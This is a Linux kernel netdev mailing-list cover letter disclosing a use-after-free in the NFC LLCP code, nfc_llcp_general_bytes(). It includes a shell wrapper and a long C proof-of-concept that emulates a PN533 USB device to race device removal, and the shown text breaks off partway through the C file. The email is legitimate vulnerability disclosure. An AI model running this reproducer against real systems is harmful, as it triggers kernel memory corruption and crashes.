Received: from mail-pj1-f47.google.com (mail-pj1-f47.google.com [209.85.216.47])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4E86E37AA9F
	for <netdev@vger.kernel.org>; Fri,  7 Aug 2026 16:29:05 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.47
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786120149; cv=none; b=Q7LLLPWAnttXqLSyx/eg6g4vCNcqzhjNljjPSsBABbvO8npquijeUzM8A+NL8IMJ5H1j3X0M6CXoEzx2T2Tqj8VW+a1JnQmgJJXkG9PT4kI1XzGxrHQKOCQ9ViYV4Dy5DlpY+I3hMGYPgKDB6E+ep+trDIVlZ8bepzYtSx3nwKI=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786120149; c=relaxed/simple;
	bh=pSyevj9zeBUL+ENCN3Dk7lbibyWXIiVntsD5B/fa50o=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=aRwgVVMmqo0YHq31/EX1f/YYKi/LGRWcUdHIcz7KJ/fMcXBFkexELi7M2PM7HpiskgxmVoJKrZ+8ls3tfWBrZrbni4YxgWPbfec/suSMFTwzq46Fh8pdESLYgOaqscUfcsOnk3pWYn2Pn14mfMxkdvMX+a7/Rv0SPZN97/e7u+c=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=qQPB6+qM; arc=none smtp.client-ip=209.85.216.47
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="qQPB6+qM"
Received: by mail-pj1-f47.google.com with SMTP id 98e67ed59e1d1-38e69bdb0fcso3166962a91.1
        for <netdev@vger.kernel.org>; Fri, 07 Aug 2026 09:29:05 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1786120144; x=1786724944; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=ImvFrT/RL0nX89ERWNZfhKgL28tTW+9UYVtXJWjLamE=;
        b=qQPB6+qMwnzFS+WSLlWJhrKXx+Hp43R5/vhcEYXK6IaMtQeiuSIHPay1NKlQAe6oiO
         hXXXw9k9MuRNPpTDrkF70LnjctTz34MiOvh8SoY1+GWyZkj1VqFKhz9K/Snnq/wIwSN/
         Vwkuop/fb2++AeFxwWWJhrGeRUsalhwQjc7xJXFRsCTONfkky5xZpJmgdF1WzNaRd1p7
         2KvebgqE3sDpC323QQQQprrwBuPc5eipyEvMPE8zJAvIrLTCkL0otedBbwyPJDQ5T3RR
         PAraeCU1scOASlcp5Ew6aP/xIHCJsdjvGUGKc7xuDWxZqnmU9lDnReHDCd8zWeH2oh1L
         g00g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786120144; x=1786724944;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=ImvFrT/RL0nX89ERWNZfhKgL28tTW+9UYVtXJWjLamE=;
        b=fZ2z5LDowKK4utftDH7+t2BemuAeJeTSBZfBD29ZxUzG3EEZFuI3XAlOaMY2mxE895
         v0/IgHH9DlmJCSaD+pJynK58v8cLND/NmplkbbVp8CVL4lU6mZq/q/DrjagvTk2FoB8I
         XFhV6w17gKjhPXN6/pErT4pBJ5tvzZ/xTh+2e5evR2fEUG8SCvJZEbok9tqfNiQ6piuR
         vpk69WywmSLGPg3R8lfR2lDPGOC2ucJlcWzfdZLK03h8XBLMytXIPtDT1UJB2VIEjTCI
         AuIFAqVVhaJlurr0b8g5JwJDuzgQ+3gK8BYph29VWYXZV2sWID3T1wGfUYkOl+SSTK6T
         DxbA==
X-Forwarded-Encrypted: i=1; AHgh+RrHEQceEXIFiSrIHFpqVxNwje9fzq1pIBZ2kShhr1ekGpII9b8vIclXBAss3iM3Kf6/42/D5k4=@vger.kernel.org
X-Gm-Message-State: AOJu0YzX+i9zfGEPT4KB3VQRhhymhq5mFLK10lFwBm3IkoqYIj9Qv3OA
	5MdZkKy8es196CmvpYzndlXpOo16OCce90QWGQXLeRutLOCoevoAf0NXja5Nd2f3d088
X-Gm-Gg: AR+sD12iZiPqGmwl4MXTdQHgK4Wz/vR8N1bIQ1KReHRhRvloILyLGb6GWYB5ZIM6Bji
	hvnx9ia3kQre16JP0FbaQHkBGt1xiwPEjXlLgYVCAWvfQ4prkxJyBq97LaZK81390hqecmkNMMB
	NguK6rwOSAZuxJNG+CcEJa9ecRgi9HtSFduMcrjswxRJjteIJ3PYpU2+stTNUT0F2dYNusfzI+X
	TnOA4ARVvX2G+wXyzvQXwx+LzXxVOA1Gz2QUfxWd6+RbccH7kYk5AVRoPoebkY1B4qCIibH9PQq
	EMpuoTu8Anw1ng7xm3ibbUt+Y6c2JZhbXZ+pfTvJp1fnf0ktk96ZjE6qRT2j4LjVnhERsTMTWFN
	80sM/MaSFDOkDMwUPs17HdsQE+B5i6Y3/c3Nu62CYrPAAOZti8fR3qt1dlAY2cc3XxEN46BLu5I
	PqFbDOxKD1uuqTWUBSbpwXksqwQoHm7oefWxgxfbmGX+J6voGSNly6lcY=
X-Received: by 2002:a17:90b:5683:b0:381:26f:8f05 with SMTP id 98e67ed59e1d1-3903c5380f7mr23857019a91.3.1786120144062;
        Fri, 07 Aug 2026 09:29:04 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3925fc6dfcdsm3179485a91.4.2026.08.07.09.28.50
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 07 Aug 2026 09:29:03 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: oe-linux-nfc@lists.linux.dev,
	netdev@vger.kernel.org
Cc: david@ixit.cz,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	pengpeng@iscas.ac.cn,
	kees@kernel.org,
	error27@gmail.com,
	raoxu@uniontech.com,
	dddddd@hust.edu.cn,
	ian.ray@gehealthcare.com,
	joe@dama.to,
	kuniyu@google.com,
	linma@zju.edu.cn,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH net 0/1] net/nfc: Fix Use-After-Free in nfc_llcp_general_bytes()
Date: Sat,  8 Aug 2026 00:28:50 +0800
Message-ID: <cover.1786029423.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.51.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/nfc/llcp_core.c. The bug results in a
use-after-free when accessing the local general bytes after the LLCP local
context has been released.

The issue can be triggered from an unprivileged user namespace with the
required NFC device access.

We've tested the fix, and it should not affect any other functionality.
We will provide detailed information about the bug in this email, along with
a PoC to trigger it.

---- details below ----

Bug details:
In net/nfc/llcp_core.c, nfc_llcp_general_bytes() drops the reference count of
the LLCP local context by calling nfc_llcp_local_put(local) before returning
local->gb. This causes the returned pointer to become invalid after the local
context is released.

When a concurrent device unregistration occurs (for example, through USB
disconnect of a PN533 raw gadget device), the local context object may be freed
while callers such as pn533_poll_dep() still access the returned general-bytes
pointer. This results in a Use-After-Free read, which can trigger a kernel
panic under KASAN.

Reproducer:
The bug can be triggered using the provided script:

chmod +x poc.sh
./poc.sh

Alternatively, build and run the reproducer directly:

gcc -O2 -static -o poc poc.c
./poc

The PoC was tested in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.sh------
#!/bin/sh
set -eu

DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
cd "$DIR"

if command -v make >/dev/null 2>&1; then
	make
else
	${CC:-gcc} ${CFLAGS:--O2 -Wall -Wextra -pthread} -o poc poc.c
fi

max_attempts=${ATTEMPTS:-20}
delays=${RF_DISCONNECT_DELAYS_MS:-"0 1 2 4 6"}
timeout_bin=$(command -v timeout || true)

for delay in $delays; do
	attempt=1
	while [ "$attempt" -le "$max_attempts" ]; do
		echo "delay ${delay}ms attempt $attempt"
		dmesg -C >/dev/null 2>&1 || true
		rc=0
		if [ -n "$timeout_bin" ]; then
			RF_DISCONNECT_DELAY_MS=$delay "$timeout_bin" 20 ./poc || rc=$?
		else
			RF_DISCONNECT_DELAY_MS=$delay ./poc || rc=$?
		fi
		if dmesg | grep -Eq 'BUG: KASAN|KASAN:|Oops:|general protection fault|kernel BUG at'; then
			exit 0
		fi
		if [ "$rc" -ne 2 ] && [ "$rc" -ne 124 ] && [ "$rc" -ne 0 ]; then
			exit "$rc"
		fi
		attempt=$((attempt + 1))
		sleep 1
	done
done

exit 1
------END poc.sh--------

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nfc.h>
#include <linux/usb/ch9.h>
#include <linux/usb/raw_gadget.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define BULK_IN_ADDR  0x81
#define BULK_OUT_ADDR 0x01
#define CTRL_TIMEOUT_MS 10000
#define NFC_WAIT_MS 10000

#define PN533_VENDOR_ID  0x04cc
#define PN533_PRODUCT_ID 0x2533
#define PN533_CMD_GET_FIRMWARE_VERSION 0x02
#define PN533_CMD_SAM_CONFIGURATION    0x14
#define PN533_CMD_RF_CONFIGURATION     0x32
#define PN533_CMD_IN_LIST_PASSIVE_TARGET 0x4a
#define PN533_CMD_TG_INIT_AS_TARGET    0x8c
#define PN533_STD_FRAME_DIR_OUT 0xd4
#define PN533_STD_FRAME_DIR_IN  0xd5

static const uint8_t pn533_ack_frame[] = {0x00, 0x00, 0xff, 0x00, 0xff, 0x00};

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif
#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif
#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int)NLA_ALIGN(sizeof(struct nlattr)))
#endif
#ifndef NLA_DATA
#define NLA_DATA(na) ((void *)((char *)(na) + NLA_HDRLEN))
#endif
#ifndef NLA_NEXT
#define NLA_NEXT(na, attrlen) ((attrlen) -= NLA_ALIGN((na)->nla_len), \
			       (struct nlattr *)(((char *)(na)) + NLA_ALIGN((na)->nla_len)))
#endif
#ifndef NLA_OK
#define NLA_OK(na, len) ((len) > 0 && (na)->nla_len >= sizeof(struct nlattr) && \
			 (na)->nla_len <= (len))
#endif
#ifndef USB_RAW_EVENT_RESET
#define USB_RAW_EVENT_RESET 5
#endif
#ifndef USB_RAW_EVENT_DISCONNECT
#define USB_RAW_EVENT_DISCONNECT 6
#endif

struct usb_descs {
	struct usb_device_descriptor dev;
	struct {
		struct usb_config_descriptor cfg;
		struct usb_interface_descriptor intf;
		struct usb_endpoint_descriptor ep_out;
		struct usb_endpoint_descriptor ep_in;
	} __attribute__((packed)) cfg1;
	struct usb_qualifier_descriptor qual;
};

struct gadget_state {
	int fd;
	int ep_in;
	int ep_out;
	pthread_t bulk_thread;
	pthread_t ctrl_thread;
	pthread_t main_thread;
	int base_nfc_count;
	int nfc_index;
	int ctrl_rc;
	int rf_disconnect_delay_ms;
	volatile bool configured;
	volatile bool stop;
	volatile bool saw_disconnect;
	volatile bool saw_first_poll;
	volatile uint8_t first_poll_cmd;
	volatile bool disconnect_armed;
	volatile bool disconnect_done;
	pthread_mutex_t lock;
	pthread_cond_t cond;
};

static void sigusr1_handler(int signo)
{
	(void)signo;
}

static int read_text_file(const char *path, char *buf, size_t len)
{
	int fd;
	ssize_t n;

	fd = open(path, O_RDONLY);
	if (fd < 0)
		return -1;

	n = read(fd, buf, len - 1);
	close(fd);
	if (n < 0)
		return -1;

	buf[n] = '\0';
	while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
		buf[--n] = '\0';

	return 0;
}

static int choose_udc_name(char *name, size_t len)
{
	DIR *dir;
	struct dirent *de;

	dir = opendir("/sys/class/udc");
	if (!dir)
		return -1;

	while ((de = readdir(dir)) != NULL) {
		char state_path[256];
		char state[64];

		if (strncmp(de->d_name, "dummy_udc.", 10))
			continue;

		snprintf(state_path, sizeof(state_path), "/sys/class/udc/%s/state",
			 de->d_name);
		if (read_text_file(state_path, state, sizeof(state)) < 0)
			continue;
		if (strcmp(state, "not attached"))
			continue;

		snprintf(name, len, "%s", de->d_name);
		closedir(dir);
		return 0;
	}

	closedir(dir);
	errno = EBUSY;
	return -1;
}

static uint8_t checksum8(const uint8_t *buf, size_t len)
{
	uint8_t sum = 0;

	while (len--)
		sum += *buf++;

	return (uint8_t)(~sum + 1);
}

static int msleep_retry(int ms)
{
	struct timespec ts = {
		.tv_sec = ms / 1000,
		.tv_nsec = (long)(ms % 1000) * 1000000L,
	};

	while (nanosleep(&ts, &ts) && errno == EINTR)
		;

	return 0;
}

static int getenv_int(const char *name, int def)
{
	const char *s = getenv(name);
	char *end;
	long v;

	if (!s || !*s)
		return def;

	errno = 0;
	v = strtol(s, &end, 0);
	if (errno || end == s || *end != '\0')
		return def;

	if (v < INT32_MIN)
		return INT32_MIN;
	if (v > INT32_MAX)
		return INT32_MAX;

	return (int)v;
}

static int raw_ep_io(int fd, unsigned long req, uint16_t ep, uint16_t flags,
		     void *buf, uint32_t len)
{
	struct {
		struct usb_raw_ep_io io;
		uint8_t data[2048];
	} arg;

	if (len > sizeof(arg.data)) {
		errno = EMSGSIZE;
		return -1;
	}

	memset(&arg, 0, sizeof(arg));
	arg.io.ep = ep;
	arg.io.flags = flags;
	arg.io.length = len;
	if (buf && (req == USB_RAW_IOCTL_EP0_WRITE || req == USB_RAW_IOCTL_EP_WRITE))
		memcpy(arg.data, buf, len);

	if (ioctl(fd, req, &arg) < 0)
		return -1;

	if (buf && (req == USB_RAW_IOCTL_EP0_READ || req == USB_RAW_IOCTL_EP_READ))
		memcpy(buf, arg.data, arg.io.length);

	return (int)arg.io.length;
}

static int raw_event_fetch(int fd, struct usb_raw_event **out)
{
	struct {
		struct usb_raw_event event;
		uint8_t data[512];
	} *arg;
	int ret;

	arg = calloc(1, sizeof(*arg));
	if (!arg)
		return -1;

	arg->event.length = sizeof(arg->data);
	ret = ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, &arg->event);
	if (ret < 0) {
		free(arg);
		return -1;
	}

	*out = &arg->event;
	return 0;
}

static int raw_ep0_write(int fd, const void *buf, size_t len)
{
	return raw_ep_io(fd, USB_RAW_IOCTL_EP0_WRITE, 0, 0, (void *)buf, len);
}

static int raw_ep0_read(int fd, void *buf, size_t len)
{
	return raw_ep_io(fd, USB_RAW_IOCTL_EP0_READ, 0, 0, buf, len);
}

static int raw_ep_write(int fd, uint16_t ep, const void *buf, size_t len)
{
	return raw_ep_io(fd, USB_RAW_IOCTL_EP_WRITE, ep, 0, (void *)buf, len);
}

static int raw_ep_read(int fd, uint16_t ep, void *buf, size_t len)
{
	return raw_ep_io(fd, USB_RAW_IOCTL_EP_READ, ep, 0, buf, len);
}

static int make_string_desc(uint8_t *dst, size_t dst_len, const char *src)
{
	size_t i, slen = strlen(src);
	size_t total = 2 + slen * 2;

	if (dst_len < total)
		return -1;

	dst[0] = total;
	dst[1] = USB_DT_STRING;
	for (i = 0; i < slen; i++) {
		dst[2 + i * 2] = (uint8_t)src[i];
		dst[3 + i * 2] = 0;
	}

	return (int)total;
}

static void fill_descs(struct usb_descs *d)
{
	memset(d, 0, sizeof(*d));

	d->dev.bLength = sizeof(d->dev);
	d->dev.bDescriptorType = USB_DT_DEVICE;
	d->dev.bcdUSB = htole16(0x0200);
	d->dev.bDeviceClass = USB_CLASS_PER_INTERFACE;
	d->dev.bMaxPacketSize0 = 64;
	d->dev.idVendor = htole16(PN533_VENDOR_ID);
	d->dev.idProduct = htole16(PN533_PRODUCT_ID);
	d->dev.bcdDevice = htole16(0x0001);
	d->dev.iManufacturer = 1;
	d->dev.iProduct = 2;
	d->dev.iSerialNumber = 3;
	d->dev.bNumConfigurations = 1;

	d->cfg1.cfg.bLength = sizeof(d->cfg1.cfg);
	d->cfg1.cfg.bDescriptorType = USB_DT_CONFIG;
	d->cfg1.cfg.wTotalLength = htole16(sizeof(d->cfg1));
	d->cfg1.cfg.bNumInterfaces = 1;
	d->cfg1.cfg.bConfigurationValue = 1;
	d->cfg1.cfg.iConfiguration = 0;
	d->cfg1.cfg.bmAttributes = USB_CONFIG_ATT_ONE;
	d->cfg1.cfg.bMaxPower = 50;

	d->cfg1.intf.bLength = sizeof(d->cfg1.intf);
	d->cfg1.intf.bDescriptorType = USB_DT_INTERFACE;
	d->cfg1.intf.bInterfaceNumber = 0;
	d->cfg1.intf.bAlternateSetting = 0;
	d->cfg1.intf.bNumEndpoints = 2;
	d->cfg1.intf.bInterfaceClass = USB_CLASS_VENDOR_SPEC;
	d->cfg1.intf.bInterfaceSubClass = 0;
	d->cfg1.intf.bInterfaceProtocol = 0;

	d->cfg1.ep_out.bLength = sizeof(d->cfg1.ep_out);
	d->cfg1.ep_out.bDescriptorType = USB_DT_ENDPOINT;
	d->cfg1.ep_out.bEndpointAddress = BULK_OUT_ADDR;
	d->cfg1.ep_out.bmAttributes = USB_ENDPOINT_XFER_BULK;
	d->cfg1.ep_out.wMaxPacketSize = htole16(512);
	d->cfg1.ep_out.bInterval = 0;

	d->cfg1.ep_in.bLength = sizeof(d->cfg1.ep_in);
	d->cfg1.ep_in.bDescriptorType = USB_DT_ENDPOINT;
	d->cfg1.ep_in.bEndpointAddress = BULK_IN_ADDR;
	d->cfg1.ep_in.bmAttributes = USB_ENDPOINT_XFER_BULK;
	d->cfg1.ep_in.wMaxPacketSize = htole16(512);
	d->cfg1.ep_in.bInterval = 0;

	d->qual.bLength = sizeof(d->qual);
	d->qual.bDescriptorType = USB_DT_DEVICE_QUALIFIER;
	d->qual.bcdUSB = htole16(0x0200);
	d->qual.bDeviceClass = USB_CLASS_PER_INTERFACE;
	d->qual.bMaxPacketSize0 = 64;
	d->qual.bNumConfigurations = 1;
}

static int pn533_frame_cmd(const uint8_t *buf, size_t len)
{
	if (len >= sizeof(pn533_ack_frame) &&
	    !memcmp(buf, pn533_ack_frame, sizeof(pn533_ack_frame)))
		return -2;

	if (len < 7)
		return -1;
	if (buf[0] != 0x00 || buf[1] != 0x00 || buf[2] != 0xff)
		return -1;
	if ((uint8_t)(buf[3] + buf[4]) != 0x00)
		return -1;
	if (buf[5] != PN533_STD_FRAME_DIR_OUT)
		return -1;

	return buf[6];
}

static size_t pn533_build_resp(uint8_t cmd, const uint8_t *payload,
			       size_t payload_len, uint8_t *out, size_t out_len)
{
	size_t datalen = payload_len + 2;

	if (out_len < payload_len + 9)
		return 0;

	out[0] = 0x00;
	out[1] = 0x00;
	out[2] = 0xff;
	out[3] = datalen;
	out[4] = (uint8_t)(~datalen + 1);
	out[5] = PN533_STD_FRAME_DIR_IN;
	out[6] = cmd + 1;
	if (payload_len)
		memcpy(out + 7, payload, payload_len);
	out[7 + payload_len] = checksum8(out + 5, datalen);
	out[8 + payload_len] = 0x00;

	return payload_len + 9;
}

static int count_nfc_devices(void)
{
	DIR *dir;
	struct dirent *de;
	int count = 0;

	dir = opendir("/sys/class/nfc");
	if (!dir)
		return -1;

	while ((de = readdir(dir)) != NULL) {
		if (!strncmp(de->d_name, "nfc", 3))
			count++;
	}

	closedir(dir);
	return count;
}

static int highest_nfc_index(void)
{
	DIR *dir;
	struct dirent *de;
	int max = -1;

	dir = opendir("/sys/class/nfc");
	if (!dir)
		return -1;

	while ((de = readdir(dir)) != NULL) {
		int idx;

		if (strncmp(de->d_name, "nfc", 3))
			continue;
		idx = atoi(de->d_name + 3);
		if (idx > max)
			max = idx;
	}

	closedir(dir);
	return max;
}

static int wait_for_new_nfc_device(int base_count)
{
	int elapsed = 0;

	while (elapsed < NFC_WAIT_MS) {
		int count = count_nfc_devices();
		int max = highest_nfc_index();

		if (count > base_count && max >= 0)
			return max;

		msleep_retry(50);
		elapsed += 50;
	}

	return -1;
}

static int nla_put_u32(uint8_t *buf, size_t *off, size_t buflen, uint16_t type,
		       uint32_t value)
{
	struct nlattr *na;
	size_t len = NLA_ALIGN(sizeof(*na) + sizeof(value));

	if (*off + len > buflen)
		return -1;

	na = (struct nlattr *)(buf + *off);
	na->nla_type = type;
	na->nla_len = sizeof(*na) + sizeof(value);
	memcpy((uint8_t *)na + sizeof(*na), &value, sizeof(value));
	memset(buf + *off + na->nla_len, 0, len - na->nla_len);
	*off += len;
	return 0;
}

static int genl_resolve_family(int fd, uint16_t *family_id)
{
	char buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *genl = (struct genlmsghdr *)(nlh + 1);
	struct nlattr *na;
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	size_t off = NLMSG_ALIGN(sizeof(*nlh)) + GENL_HDRLEN;
	uint32_t seq = 1;
	char rbuf[512];
	struct nlmsghdr *rnlh;
	int ret;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = off;
	nlh->nlmsg_type = GENL_ID_CTRL;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = seq;
	genl->cmd = CTRL_CMD_GETFAMILY;
	genl->version = 1;

	na = (struct nlattr *)(buf + off);
	na->nla_type = CTRL_ATTR_FAMILY_NAME;
	na->nla_len = sizeof(*na) + strlen(NFC_GENL_NAME) + 1;
	memcpy((uint8_t *)na + sizeof(*na), NFC_GENL_NAME, strlen(NFC_GENL_NAME) + 1);
	off += NLA_ALIGN(na->nla_len);
	nlh->nlmsg_len = off;

	ret = sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
	if (ret < 0)
		return -1;

	for (;;) {
		ret = recv(fd, rbuf, sizeof(rbuf), 0);
		if (ret < 0)
			return -1;

		for (rnlh = (struct nlmsghdr *)rbuf; NLMSG_OK(rnlh, ret);
		     rnlh = NLMSG_NEXT(rnlh, ret)) {
			if (rnlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(rnlh);

				if (err->error)
					return -1;
				continue;
			}

			if (rnlh->nlmsg_type == GENL_ID_CTRL) {
				struct genlmsghdr *rgenl = NLMSG_DATA(rnlh);
				size_t len = rnlh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
				struct nlattr *attr;

				for (attr = (struct nlattr *)((uint8_t *)rgenl + GENL_HDRLEN);
				     NLA_OK(attr, len);
				     attr = NLA_NEXT(attr, len)) {
					if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
						memcpy(family_id, NLA_DATA(attr),
						       sizeof(*family_id));
						return 0;
					}
				}
			}
		}
	}
}

static int genl_talk_simple(int fd, uint16_t family_id, uint8_t cmd,
			    uint32_t dev_idx, uint32_t im_protocols,
			    uint32_t tm_protocols, bool start_poll)
{
	uint8_t buf[512];
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	struct genlmsghdr *genl = (struct genlmsghdr *)(nlh + 1);
	struct sockaddr_nl sa = { .nl_family = AF_NETLINK };
	size_t off = NLMSG_ALIGN(sizeof(*nlh)) + GENL_HDRLEN;
	static uint32_t seq = 10;
	uint8_t rbuf[512];
	int ret;

	memset(buf, 0, sizeof(buf));
	nlh->nlmsg_len = off;
	nlh->nlmsg_type = family_id;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_seq = ++seq;
	genl->cmd = cmd;
	genl->version = NFC_GENL_VERSION;

	if (nla_put_u32(buf, &off, sizeof(buf), NFC_ATTR_DEVICE_INDEX, dev_idx))
		return -1;
	if (start_poll) {
		if (nla_put_u32(buf, &off, sizeof(buf), NFC_ATTR_IM_PROTOCOLS,
				im_protocols))
			return -1;
		if (nla_put_u32(buf, &off, sizeof(buf), NFC_ATTR_TM_PROTOCOLS,
				tm_protocols))
			return -1;
	}
	nlh->nlmsg_len = off;

	ret = sendto(fd, buf, nlh->nlmsg_len, 0, (struct sockaddr *)&sa, sizeof(sa));
	if (ret < 0)
		return -1;

	for (;;) {
		struct nlmsghdr *rnlh;
		int rem;

		ret = recv(fd, rbuf, sizeof(rbuf), 0);
		if (ret < 0)
			return -1;

		rem = ret;
		for (rnlh = (struct nlmsghdr *)rbuf; NLMSG_OK(rnlh, rem);
		     rnlh = NLMSG_NEXT(rnlh, rem)) {
			if (rnlh->nlmsg_seq != seq)
				continue;
			if (rnlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(rnlh);

				if (err->error) {
					errno = -err->error;
					return -1;
				}
				return 0;
			}
		}
	}
}

static void *ctrl_thread_main(void *arg)
{
	struct gadget_state *st = arg;
	int fd;
	uint16_t family_id;

	st->nfc_index = wait_for_new_nfc_device(st->base_nfc_count);
	if (st->nfc_index < 0) {
		fprintf(stderr, "no new nfc device appeared\n");
		st->stop = true;
		pthread_kill(st->main_thread, SIGUSR1);
		st->ctrl_rc = -1;
		return NULL;
	}
	fprintf(stderr, "using nfc index %d\n", st->nfc_index);

	fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (fd < 0) {
		st->stop = true;
		pthread_kill(st->main_thread, SIGUSR1);
		st->ctrl_rc = -1;
		return NULL;
	}

	if (genl_resolve_family(fd, &family_id) < 0) {
		perror("genl_resolve_family");
		st->stop = true;
		pthread_kill(st->main_thread, SIGUSR1);
		close(fd);
		st->ctrl_rc = -1;
		return NULL;
	}

	msleep_retry(200);

	if (genl_talk_simple(fd, family_id, NFC_CMD_DEV_UP, st->nfc_index, 0, 0,
			     false) < 0) {
		perror("NFC_CMD_DEV_UP");
		st->stop = true;
		pthread_kill(st->main_thread, SIGUSR1);
		close(fd);
		st->ctrl_rc = -1;
		return NULL;
	}

	if (genl_talk_simple(fd, family_id, NFC_CMD_START_POLL, st->nfc_index,
			     NFC_PROTO_MIFARE_MASK, NFC_PROTO_NFC_DEP_MASK,
			     true) < 0) {
		perror("NFC_CMD_START_POLL");
		st->stop = true;
		pthread_kill(st->main_thread, SIGUSR1);
		close(fd);
		st->ctrl_rc = -1;
		return NULL;
	}

	fprintf(stderr, "start_poll submitted\n");

	pthread_mutex_lock(&st->lock);
	while (!st->stop)
		pthread_cond_wait(&st->cond, &st->lock);
	pthread_mutex_unlock(&st->lock);

	close(fd);
	st->ctrl_rc = 0;
	return NULL;
}

static int send_ack(int fd, int ep_in)
{
	return raw_ep_write(fd, ep_in, pn533_ack_frame, sizeof(pn533_ack_frame));
}

static int send_resp_frame(int fd, int ep_in, uint8_t cmd,
			   const uint8_t *payload, size_t payload_len)
{
	uint8_t frame[512];
	size_t len = pn533_build_resp(cmd, payload, payload_len, frame, sizeof(frame));

	if (!len) {
		errno = EMSGSIZE;
		return -1;
	}

	return raw_ep_write(fd, ep_in, frame, len);
}

static void arm_disconnect(struct gadget_state *st)
{
	pthread_mutex_lock(&st->lock);
	st->disconnect_armed = true;
	pthread_cond_broadcast(&st->cond);
	pthread_mutex_unlock(&st->lock);
}

static void mark_first_poll(struct gadget_state *st, uint8_t cmd)
{
	pthread_mutex_lock(&st->lock);
	if (!st->saw_first_poll) {
		st->saw_first_poll = true;
		st->first_poll_cmd = cmd;
	}
	pthread_cond_broadcast(&st->cond);
	pthread_mutex_unlock(&st->lock);
}

static void maybe_disconnect_after_rf(struct gadget_state *st)
{
	pthread_mutex_lock(&st->lock);
	if (!st->disconnect_armed || st->disconnect_done) {
		pthread_mutex_unlock(&st->lock);
		return;
	}
	st->disconnect_done = true;
	pthread_mutex_unlock(&st->lock);

	/*
	 * The driver queues poll_work with a 10 ms delay after this response.
	 * Keep the delay tunable so the wrapper can sweep timings.
	 */
	fprintf(stderr, "disconnecting gadget after RF configuration\n");
	if (st->rf_disconnect_delay_ms > 0)
		msleep_retry(st->rf_disconnect_delay_ms);
	close(st->fd);
	st->saw_disconnect = true;
	st->stop = true;
	pthread_kill(st->main_thread, SIGUSR1);
}

static void *bulk_thread_main(void *arg)
{
	struct gadget_state *st = arg;
	uint8_t req[2048];

	while (!st->stop) {
		int rc;
		int cmd;

		rc = raw_ep_read(st->fd, st->ep_out, req, sizeof(req));
		if (rc < 0)
			break;

		cmd = pn533_frame_cmd(req, rc);
